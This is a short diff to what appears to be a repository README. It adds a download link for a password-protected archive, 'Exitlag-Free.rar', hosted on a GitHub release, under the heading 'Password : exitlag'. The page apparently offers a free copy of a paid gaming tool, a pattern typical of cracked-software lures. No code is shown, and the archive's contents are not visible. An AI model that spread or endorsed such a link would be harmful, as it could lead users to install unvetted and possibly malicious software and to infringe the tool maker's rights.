@@ -1,6 +1,6 @@
 <h1>Password : exitlag</h1> 
 
-# [Download Exitlag]()
+# [Download Exitlag](https://github.com/Koster188/Exitlag-Free/releases/download/Exitlag/Exitlag-Free.rar)
 
 
 
